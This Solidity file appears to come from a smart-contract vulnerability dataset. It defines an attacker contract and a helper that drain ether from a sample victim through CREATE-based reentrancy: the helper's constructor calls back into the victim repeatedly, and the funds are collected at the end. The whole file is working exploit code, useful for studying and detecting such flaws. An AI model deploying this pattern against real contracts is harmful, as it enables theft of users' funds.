// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../dataset/cross-contract/create/Create_ree1.sol";

// the whole mechanism relies on the CREATE instructions allowing a custom code to be executed as constructor when a contract is instantiated and deployed
// the Attacker contract below reenters the victim contract C above and forces it to create a new instance of Aux at each invocation
// the money transferred to each new instance is eventually sent and accumulated by the Attacker contract

contract CreateRee1Attacker {
    bytes private create_aux_initcode;
    CreateRee1 private victim;

    constructor(address _victim) {
        victim = CreateRee1(_victim);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        victim.deploy_and_transfer(getCreationCode());
    }

    function attackStep2() public payable {
        if (address(victim).balance >= 1 ether) {
            victim.deploy_and_transfer(getCreationCode());
        }
    }

    function getCreationCode() public view returns (bytes memory) {
        bytes memory contractCode = type(CreateRee1AttackerAux).creationCode;
        return abi.encodePacked(contractCode, abi.encode(address(this)));
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract CreateRee1AttackerAux {
    constructor(address attacker) payable {
        CreateRee1Attacker(attacker).attackStep2{value: msg.value}();
    }
}
